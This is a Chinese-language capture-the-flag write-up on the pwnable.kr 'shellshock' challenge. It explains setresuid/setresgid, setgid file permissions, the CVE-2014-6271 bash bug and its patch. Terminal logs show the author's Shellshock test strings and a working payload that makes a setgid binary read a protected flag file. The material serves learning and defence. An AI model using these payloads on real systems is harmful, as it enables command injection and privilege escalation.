# shellshock



shllsock.c

```c
#include <stdio.h>
int main(){
	setresuid(getegid(), getegid(), getegid());
	setresgid(getegid(), getegid(), getegid());
	system("/home/shellshock/bash -c 'echo shock_me'");
	return 0;
}

```

其实就是破壳漏洞的利用





理解下函数



getegid()  (获得目前进程有效的组识别码--组别码用来决定执行时组的权限--同时还有其他类似函数) [geigid--区别](https://www.jb51.net/article/71668.htm)

[同时需要了解下unix下uid的知识](https://blog.csdn.net/findstr/article/details/7330592)



#### 名称

> getegid - 获取有效的组ID

#### 概要

> `#include <unistd.h>`
>
> gid_t getegid(void);

#### 描述

> 所述*getegid*（）函数将返回调用进程的有效组ID。

#### 返回值

> 该*getegid*（）函数将永远是成功的，没有返回值保留指示错误。

#### 错误

> 没有定义错误。



setresuid()  setresgid()

#### NAME      

```
       setresuid，setresgid  - 设置真实，有效和已保存的用户或组ID
```

#### 大纲     

```
       #define _GNU_SOURCE          / *请参阅feature_test_macros（7）* /
        #include <unistd.h>

       int setresuid（uid_t ruid ，uid_t euid ，uid_t suid ）; 
       int setresgid（gid_t rgid ，gid_t egid ，gid_t sgid ）;
```

#### 描述      

```
       setresuid（）设置真实用户ID，有效用户ID和
       已保存调用进程的set-user-ID。

       无特权的进程可能会改变其真正的UID，有效的UID和
       保存的set-user-ID，每个到以下之一：当前的真实UID，当前
       有效的UID或当前保存的set-user-ID。

       特权进程（在Linux上，具有CAP_SETUID功能的进程）
       可以设置其真实的UID，有效的UID和保存的set-user-ID
       任意值。

       如果其中一个参数等于-1，则相应的值不是
       改变。

       无论对真正的UID做了哪些改变，有效的UID，
       并保存set-user-ID，文件系统UID始终设置为相同
       值作为（可能是新的）有效UID。

       完全类似地，setresgid（）设置真正的GID，有效的GID，
       并保存调用进程的set-group-ID（并始终修改
       文件系统GID与有效GID相同）
       对非特权进程的限制相同。
```

#### 返回值         

```
       成功时，返回零。出错时，返回-1，错误是
       适当设定。

       注意：有些情况下，即使调用者，setresuid（）也可能失败
       是UID 0; 省略检查失败是一个严重的安全错误
       从setresuid（）返回。
```

#### 错误       

```
       EAGAIN呼叫会改变呼叫者的真实UID（即ruid确实如此）
              与调用者的真实UID不匹配），但有一个临时的
              失败分配必要的内核数据结构。

       EAGAIN ruid与调用者的真实UID不匹配，此调用会
              带来属于真实用户ID的进程数
              RUID了来电者的RLIMIT_NPROC资源限制。以来
              Linux 3.1，这种错误情况不再发生（但强大
              应用程序应检查此错误）; 看到描述
              的EAGAIN在execve的（2） 。

       EINVAL一个或多个目标用户或组ID无效
              此用户命名空间。

       EPERM  调用进程没有特权（没有
              其用户名称空间中的必要功能）并尝试过
              将ID更改为不允许的值。对于
              setresuid（），必要的能力是CAP_SETUID ; 对于
               setresgid（），它是CAP_SETGID。
```

所以 代码的 前两句

学习下linux中的权限问题[linux权限说明](https://blog.csdn.net/lee244868149/article/details/39694099)主要说了uid的作用

以及[linux系统调用原理](https://blog.csdn.net/orange_os/article/details/7485069)

参数位说明

用户真实ID：用来表示进程由那个用户控制

有效用户ID（set User id）:表示为新创建的文件分配所有权，检查文件访问许可等操作，同时为该文件的所有者

已保存的用户或组ID

getegid()  #获取有效组标识号 

setresuid(getegid(), getegid(), getegid()); #分别设置真实和有效的用户标识号 
setresgid(getegid(), getegid(), getegid()); #分别设置真实和有效的的组标识号 

尝试把 user group  都设置为有效组标识号



然后产看当前文件的权限



```shell
shellshock@ubuntu:~$ ls -l
total 960
-r-xr-xr-x 1 root shellshock     959120 Oct 12  2014 bash
-r--r----- 1 root shellshock_pwn     47 Oct 12  2014 flag
-r-xr-sr-x 1 root shellshock_pwn   8547 Oct 12  2014 shellshock
-r--r--r-- 1 root root              188 Oct 12  2014 shellshock.c
```

登录的用户名为 shellshock 

但是观察 shellshock 是有文件所有者的gid执行程序的（说白了，就是给你一个上帝小能力）[Linux系统中的文件的s权限](https://blog.csdn.net/awhip9/article/details/77774693) 对flag也是有读取能力的



代码中setreuid中设置的各uid均是预置的高权限，即egid——shellshock_pwn，因此这个可执行文件在执行到system一行时，就已经是具有shellshock_pwn组权限的程序 

bash也是用这个组权限在打开，所以对flag是可读的 

破壳漏洞[破壳（ShellShock）漏洞样本分析报告](http://www.freebuf.com/articles/system/45390.html)CVE-2014-6271  [an_tiy自己的报告](http://www.freebuf.com/news/48331.html)

学习一下

```
漏洞成因:
Bash 4.3以及之前的版本在处理某些构造的环境变量时存在安全漏洞，向环境变量值内的函数定义后添加多余的字符串会触发此漏洞，攻击者可利用此漏洞改变或绕过环境限制，以执行任意的shell命令,甚至完全控制目标系统

受到该漏洞影响的bash使用的环境变量是通过函数名称来调用的，以“(){”开头通过环境变量来定义的。而在处理这样的“函数环境变量”的时候，并没有以函数结尾“}”为结束，而是一直执行其后的shell命令

漏洞测试:
(1).CVE-2014-6271 测试方式:
      env x='() { :;}; echo vulnerable' bash -c "echo this is a test" 
   (2).CVE-2014-7169 测试方式:(CVE-2014-6271补丁更新后仍然可以绕过)
      env -i X=';() { (a)=>\' bash -c 'echo date'; cat echo
```

然后 就是 

Bash有一种独有的使用环境变量来定义函数的方法。如果环境变量的值以字符”(){”开头，那么这个变量就会被当作是一个导入函数的定义（Export）,这种定义只有在shell启动的时候才会生效。 

env x='() { :;};                         echo vulnerable'                   bash -c  "echo this is a test"

A                                               B                                            C

问题是

bash解析完 函数定义 执行函数时  他自动导入函数的解析器 越过函数定义的结尾  然后执行后面的代码

理解为  

​     bash   ./home/test echo 123    truefile    中间这个   ./home/test echo 123 是被篡改的环境变量 被执行了2333



**env命令**用于显示系统中已存在的环境变量，以及在定义的环境中执行指令。该命令只使用"-"作为参数选项时，隐藏了选项"-i"的功能。若没有设置任何选项和参数时，则直接显示当前的环境变量。 

- ```
  ### 语法 
  
  ​```
  env(选项)(参数)
  ​```
  
  ### 选项 
  
  ​```
  -i：开始一个新的空的环境；
  -u<变量名>：从当前环境中删除指定的变量。
  ​```
  
  ### 参数 
  
  - 变量定义：定义在新的环境中变量，定义多个变量定义用空格隔开。格式为“变量名=值”；
  - 指定：指定要执行的指令和参数。
  ```

修复原理

```
/builtins/common.h

#define SEVAL_FUNCDEF  0x080                 /* onlyallow function definitions */
 #define SEVAL_ONECMD  0x100                 /* onlyallow a single command
*//builtins/evalstring.c
 if((flags & SEVAL_FUNCDEF) && command->type != cm_function_def)
                   {
                   internal_warning("%s: ignoring function definition attempt", from_file);
                   should_jump_to_top_level= 0;
                   last_result= last_command_exit_value = EX_BADUSAGE;
                     break;
                   }
/builtins/evalstring.c

if (flags & SEVAL_ONECMD)
                   break;
```

宏 SEVAL_FUNCDEF  SEVAL_ONECMD 都是为了用来做边界检查的

这个flags 就是那个查询的环境变量数据  2333

然后上面有 利用方式 ，后面自己搞一个



目前就是明确了：

这个pwn 查看了 环境的异常性

名字叫shellshock 提示了破壳利用

故先验证漏洞存在性





```shell
Last login: Sat Aug  4 00:48:34 2018 from 123.21.33.191
shellshock@ubuntu:~$ env x='() { :;}; echo vulnerable' bash -c "echo this is a test"
this is a test
shellshock@ubuntu:~$ 
```

存在

那就可以利用这个漏洞来 进行 flag获取了

构造 利用代码



env x='() { :;};     echo vulnerable'       bash -c "echo this is a test"  

分为两步

首先希望是 cat flag 

那么   echo vulnerable   --->   bash -c "cat  ./flag"

然后 提升当前进程的权限  

那么  bash -c “echo this is a test ”   -----> ./shellshock

多么尴尬 不是这个漏洞   

```
Last login: Sat Aug  4 00:48:34 2018 from 123.21.33.191
shellshock@ubuntu:~$ env x='() { :;}; echo vulnerable' bash -c "echo this is a test"
this is a test
shellshock@ubuntu:~$ env x='(){ :;}; bash -c "cat ./flag"' ./shellshock
shock_me
shellshock@ubuntu:~$ env x='() { :;}; echo Vulnerable CVE-2014-6271 ' bash-c "echo test"
env: ‘bash-c’: No such file or directory
shellshock@ubuntu:~$ env x='() { :;}; echo Vulnerable CVE-2014-6271 ' bash -c "echo test"
test
shellshock@ubuntu:~$ 

```

其实并不是 而是 bash 要用他提供的  低版本bash ,emmm....... 其实 也是我命令打的问题。。

```shell
shellshock@ubuntu:~$ ./home/shellshock/bash -c "echo this is a test"
bash: ./home/shellshock/bash: No such file or directory
shellshock@ubuntu:~$ bash -c "echo this is a test"
this is a test
shellshock@ubuntu:~$ ./bash -c "echo this is a test"
this is a test
shellshock@ubuntu:~$ env x='() { :;} echo vulner' ./bash  -c "echo testststst"
./bash: x: line 0: syntax error near unexpected token `echo'
./bash: x: line 0: `x () { :;} echo vulner'
./bash: error importing function definition for `x'
testststst
shellshock@ubuntu:~$ env x='() { :;}; echo vulner' ./bash  -c "echo testststst"
vulner
testststst
shellshock@ubuntu:~$ env x='() { :;}; cat flag' ./shellshock
/home/shellshock/bash: cat: No such file or directory
Segmentation fault
shellshock@ubuntu:~$ env x='() { :;}; ./bash -c  "cat flag"' ./shellshock
only if I knew CVE-2014-6271 ten years ago..!!
Segmentation fault
shellshock@ubuntu:~$ 

```

哈哈有点蠢到家了